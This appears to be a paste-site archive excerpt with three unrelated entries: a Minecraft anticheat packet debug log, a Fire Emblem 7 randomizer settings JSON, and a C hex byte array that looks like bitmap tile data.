[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@28420d00
[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@69ac62dd
[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2e847fea
[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@20d0e82
[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3a9f29ce
[6133] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@30af0eca
(Silent) [6134] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@236a8e6e
[6134] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3d595c1a
[6134] PONG: TransactionClientWrapper{action=6133, id=0}
(Silent) [6135] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@519aa0a8
[6135] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@574a2c2d
[6135] PONG: TransactionClientWrapper{action=6134, id=0}
[6135] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@14d8be53
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5c492b5c
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2b870543
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2d2a7f5a
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7c51768a
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@69d7a197
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7ae90cf3
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4477c5b
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7355bf7f
[6135] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@27da639b
(Silent) [6136] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@9667560
[6136] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@15666d07
[6136] PONG: TransactionClientWrapper{action=6135, id=0}
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2afc7e54
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@740c8233
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@bee192
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2616aad7
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6f517e9f
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7fdc745c
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@819a844
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1bcaeb82
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7f8bcbe2
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@63e93edb
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@26f7f16a
[6136] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6a2d88cd
(Silent) [6137] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@47cfc96d
[6137] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4b589ab1
[6137] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@61ed6ae7
[6137] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7888ab11
[6137] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7e653f2d
[6137] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7167af42
[6137] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7b5759db
[6137] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@463aa583
[6137] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@11f1763e
[6137] PONG: TransactionClientWrapper{action=6136, id=0}
[6137] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5d20c6fd
[6137] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1c78d503
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@f7d6db2
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1527bae5
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4e6b9192
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@14e19591
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@70956a42
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@58cd1627
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4ab8fbad
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@526db276
[6137] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@9f10503
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@39bd5634
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@34d5a73d
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@b145dd3
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@a4c98af
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@59937324
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@40e6db64
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@69b5fc6e
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7d29817
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@451ad19a
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@33d11fa6
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7541d33e
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6640efa1
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@754574f2
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4e5269d3
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@35f18b04
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@54ad47fc
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@a915b7f
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@57d0b70f
[6137] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6e40bf5a
(Silent) [6138] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@73462a40
[6138] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@506c87c9
[6138] PONG: TransactionClientWrapper{action=6137, id=0}
[6138] TAB_COMPLETE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@50a67418
[6138] TAB_COMPLETE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@21cd9cc
(Silent) [6139] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@17b8c645
[6139] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@69cd1cba
[6139] PONG: TransactionClientWrapper{action=6138, id=0}
[6139] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5d2b9c85
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3e4e258c
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5af84930
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5b51a619
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5a9fc642
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@15b2fad8
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@d9b9097
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5bac9e53
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7f25eeb2
[6139] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7d43bfb4
(Silent) [6140] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@629c199e
[6140] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2c8d87a3
[6140] PONG: TransactionClientWrapper{action=6139, id=0}
(Silent) [6141] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@5ba13001
[6141] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@13ecca67
[6141] PONG: TransactionClientWrapper{action=6140, id=0}
[6141] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@43ecf6d6
[6141] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@23324f00
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6342745a
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@160835a7
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@32f63bf6
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@38d38e7
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@731d7c68
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@246fdaa1
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@27c56c51
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4de5224e
[6141] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5583e9a6
(Silent) [6142] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@19f7151f
[6142] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@fe39b65
[6142] PONG: TransactionClientWrapper{action=6141, id=0}
(Silent) [6143] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@482c628a
[6143] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@348d92c
[6143] PONG: TransactionClientWrapper{action=6142, id=0}
[6143] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@67db7c59
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2ddf67dd
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3ef4f9b0
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7b30d6fb
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@47b54470
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@110222d4
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@822603d
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@75d8e8cc
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@18a3b4c3
[6143] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@18b73181
(Silent) [6144] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@4afec2f8
[6144] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1a3088ea
[6144] PONG: TransactionClientWrapper{action=6143, id=0}
[6144] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@51ddbe06
(Silent) [6145] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@180dd29e
[6145] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1d335238
[6145] PONG: TransactionClientWrapper{action=6144, id=0}
[6145] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@44b6e605
[6145] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5adf51a1
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@66cee972
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@61ebc501
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@121e81f7
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@326c884c
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2378720a
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1c8468a9
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7a7353f7
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2c0b9a1d
[6145] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4c8355b4
[6146] KEEP_ALIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerKeepAlive@73fdbdad
(Silent) [6146] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@3973736d
[6146] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@13f1a4ce
[6146] KEEP_ALIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientKeepAlive@635a0fdf
[6146] PONG: TransactionClientWrapper{action=6145, id=0}
[6146] CHAT_COMMAND_UNSIGNED: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3522d8f5"
6tNkAtgN?source=archive,fe7 rando settings for importing (requires yune 9.4 preview 4 build),yojimbos_law,text,Friday 18th of September 2026 10:44:55 AM CDT,"{""classes"":{""randomizePCs"":true,""includeLords"":true,""includeThieves"":true,""includeSpecial"":true,""assignEvenly"":true,""forceChange"":false,""genderOption"":""LOOSE"",""separateMonsters"":false,""randomizeEnemies"":true,""randomizeBosses"":true,""basesTransfer"":""ADJUST_TO_CLASS"",""growthOptions"":""TRANSFER_PERSONAL_GROWTHS""},""weapons"":{""shouldAddEffects"":true,""noEffectIronWeapons"":false,""noEffectSteelWeapons"":false,""noEffectThrownWeapons"":false,""includeLaguzWeapons"":false,""effectChance"":50,""effectsList"":{""statBoosts"":11,""effectiveness"":0,""unbreakable"":1,""brave"":1,""reverseTriangle"":2,""extendedRange"":2,""highCritical"":1,""criticalRange"":{""minValue"":20,""maxValue"":50},""magicDamage"":2,""poison"":0,""stealHP"":0,""critImmune"":0,""noCrit"":0,""eclipse"":0,""devil"":0}},""other"":{""randomizeAffinity"":false},""enemies"":{""minionMode"":""NONE"",""minionBuff"":10,""minionBuffStats"":{""hp"":true,""str"":true,""skl"":true,""spd"":true,""lck"":true,""def"":true,""res"":true},""improveMinionWeapons"":false,""minionImprovementChance"":25,""bossMode"":""NONE"",""bossBuff"":5,""bossBuffStats"":{""hp"":true,""str"":true,""skl"":true,""spd"":true,""lck"":true,""def"":true,""res"":true},""improveBossWeapons"":true,""bossImprovementChance"":50},""otherOptions"":{""applyEnglishPatch"":false,""tripleEffectiveness"":false,""singleRNMode"":false,""randomizeFogOfWar"":false,""fogOfWarChance"":10,""fogOfWarVisionRange"":{""minValue"":3,""maxValue"":6},""experienceRate"":""NORMAL"",""casualMode"":false},""rewards"":{""rewardMode"":""SIMILAR"",""randomizeRewards"":true,""enemyDropChance"":20,""randomizeRings"":false},""recruitmentOptions"":{""growthMode"":""USE_FILL"",""baseMode"":""AUTOLEVEL"",""autolevelMode"":""USE_NEW"",""classMode"":""USE_FILL"",""allowCrossGender"":false,""includeLords"":true,""includeThieves"":true,""includeSpecial"":false,""includeExtras"":false,""keepDescriptions"":false},""itemAssignmentOptions"":{""weaponPolicy"":""STRICT"",""shopAdjustment"":""NO_CHANGE"",""assignPromoWeapons"":true,""assignPoisonWeapons"":false},""characterShufflingOptions"":{""levelingMode"":""AUTOLEVEL"",""shuffleEnabled"":false,""chance"":25,""includedShuffles"":[],""changeDescription"":false},""prfs"":{""createPrfs"":true,""unbreakablePrfs"":true},""promotionOptions"":{""promotionMode"":""STRICT"",""allowMountChanges"":false,""allowEnemyOnlyPromotedClasses"":false,""requireCommonWeapon"":false,""keepSameDamageType"":false},""terrainOptions"":{""randomizeHealing"":false,""healingChance"":0,""randomizeStatusRecovery"":false,""statusRestoreChance"":0,""randomizeAvoid"":false,""avoidChance"":0,""randomizeDef"":false,""defChance"":0,""randomizeRes"":false,""resChance"":0,""randomizeMovementCost"":false,""keepSafeTiles"":false,""effectChance"":0,""enabled"":false},""seed"":""fourthfourth444"",""version"":18,""type"":""FE7""}"
ZmZmRsVT?source=archive,Untitled,esparade,C,Thursday 17th of September 2026 03:11:23 AM CDT,"    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF8, 0x04, 0x7A, 0x7A, 0x3A, 0x1A,
    0x02, 0x1A, 0x3A, 0x7A, 0x7A, 0x04,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x04, 0x02, 0x32, 0x62, 0xC2, 0x82,
    0xC2, 0x62, 0x32, 0x02, 0x04, 0xF8,
    0xF8, 0x04, 0x02, 0x82, 0xC2, 0xE2,
    0x72, 0x3A, 0x1A, 0x0A, 0x02, 0x04,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x04, 0xC2, 0xC2, 0xC2, 0xC2, 0xC2,
    0xC2, 0x42, 0x42, 0x82, 0x04, 0xF8,
    0xF8, 0x04, 0x0A, 0x1A, 0x3A, 0x7A,
    0xFA, 0xFA, 0xFA, 0xFA, 0xFA, 0x04,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x04, 0x02, 0x02, 0xF2, 0x4A, 0x0A,
    0x4A, 0xF2, 0x02, 0x02, 0x04, 0xF8,
    0xF8, 0x84, 0xBE, 0xA2, 0xE2, 0x22,
    0x22, 0x22, 0xE2, 0xA2, 0xBE, 0x84,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x04, 0xFA, 0xFA, 0x72, 0x22, 0x02,
    0x02, 0x02, 0x82, 0xC2, 0x04, 0xF8,
    0xF8, 0xFC, 0x86, 0x86, 0xC6, 0xE6,
    0xFE, 0xE6, 0xC6, 0x86, 0x86, 0xFC,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0xFC, 0xFE, 0xCE, 0x9E, 0x3E, 0x7E,
    0x3E, 0x9E, 0xCE, 0xFE, 0xFC, 0xF8,
    0xF8, 0xFC, 0xFE, 0x7E, 0x3E, 0x1E,
    0x8E, 0xC6, 0xE6, 0xF6, 0xFE, 0xFC,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0xFC, 0x3E, 0x3E, 0x3E, 0x3E, 0x3E,
    0x3E, 0xBE, 0xBE, 0x7E, 0xFC, 0xF8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x10, 0x2F, 0x2F, 0x2E, 0x2C,
    0x20, 0x2C, 0x2E, 0x2F, 0x2F, 0x10,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x10, 0x20, 0x21, 0x21, 0x25, 0x2D,
    0x21, 0x21, 0x21, 0x20, 0x10, 0x0F,
    0x0F, 0x10, 0x20, 0x20, 0x21, 0x23,
    0x27, 0x2E, 0x2C, 0x28, 0x20, 0x10,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x10, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x22, 0x22, 0x21, 0x10, 0x0F,
    0x0F, 0x10, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x21, 0x23, 0x27, 0x2F, 0x10,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x10, 0x20, 0x20, 0x27, 0x28, 0x28,
    0x28, 0x27, 0x20, 0x20, 0x10, 0x0F,
    0x0F, 0x10, 0x3E, 0x22, 0x23, 0x22,
    0x22, 0x22, 0x23, 0x22, 0x3E, 0x10,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x10, 0x21, 0x20, 0x20, 0x20, 0x20,
    0x22, 0x27, 0x2F, 0x2F, 0x10, 0x0F,
    0x0F, 0x1F, 0x30, 0x30, 0x31, 0x33,
    0x3F, 0x33, 0x31, 0x30, 0x30, 0x1F,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x1F, 0x3F, 0x3E, 0x3E, 0x3A, 0x32,
    0x3E, 0x3E, 0x3E, 0x3F, 0x1F, 0x0F,
    0x0F, 0x1F, 0x3F, 0x3F, 0x3E, 0x3C,
    0x38, 0x31, 0x33, 0x37, 0x3F, 0x1F,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x1F, 0x3C, 0x3C, 0x3C, 0x3C, 0x3C,
    0x3C, 0x3D, 0x3D, 0x3E, 0x1F, 0x0F,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF8, 0x04, 0x02, 0x72, 0x52, 0x52,
    0x52, 0xD2, 0x12, 0x12, 0x12, 0x14,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x04, 0x02, 0x02, 0x22, 0x22, 0xFA,
    0x22, 0x22, 0x02, 0x02, 0x04, 0xF8,
    0xF8, 0x04, 0xFA, 0x72, 0x22, 0x22,
    0x22, 0x22, 0x22, 0x72, 0xFA, 0x04,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x04, 0x02, 0xF2, 0x12, 0x12, 0x12,
    0x12, 0x12, 0xF2, 0x02, 0x04, 0xF8,
    0xF8, 0x04, 0x02, 0x0A, 0x1A, 0x3A,
    0x7A, 0x3A, 0x1A, 0x0A, 0x02, 0x04,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x04, 0x02, 0x02, 0x02, 0x02, 0x02,
    0x02, 0x02, 0x02, 0x02, 0x04, 0xF8,
    0xF8, 0x04, 0x02, 0x02, 0x82, 0xE2,
    0xFA, 0xE2, 0x82, 0x02, 0x02, 0x04,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0x7C, 0x1E, 0x0E, 0x06, 0x06, 0x02,
    0x06, 0x06, 0x0E, 0x1E, 0x7C, 0xF8,
    0xF8, 0xFC, 0xFE, 0x8E, 0xAE, 0xAE,
    0xAE, 0x2E, 0xEE, 0xEE, 0xEE, 0xEC,
    0xE8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0xFC, 0xFE, 0xFE, 0xDE, 0xDE, 0x06,
    0xDE, 0xDE, 0xFE, 0xFE, 0xFC, 0xF8,
    0xF8, 0xFC, 0x06, 0x8E, 0xDE, 0xDE,
    0xDE, 0xDE, 0xDE, 0x8E, 0x06, 0xFC,
    0xF8, 0x00, 0x00, 0x00, 0x00, 0xF8,
    0xFC, 0xFE, 0x0E, 0xEE, 0xEE, 0xEE,
    0xEE, 0xEE, 0x0E, 0xFE, 0xFC, 0xF8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x10, 0x20, 0x3F, 0x21, 0x21,
    0x21, 0x21, 0x20, 0x20, 0x20, 0x10,
    0x0F, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x1E, 0x3E, 0x3E, 0x36, 0x36, 0x36,
    0x36, 0x36, 0x3E, 0x3E, 0x1E, 0x0F,
    0x0F, 0x10, 0x2F, 0x27, 0x22, 0x22,
    0x22, 0x22, 0x22, 0x27, 0x2F, 0x10,
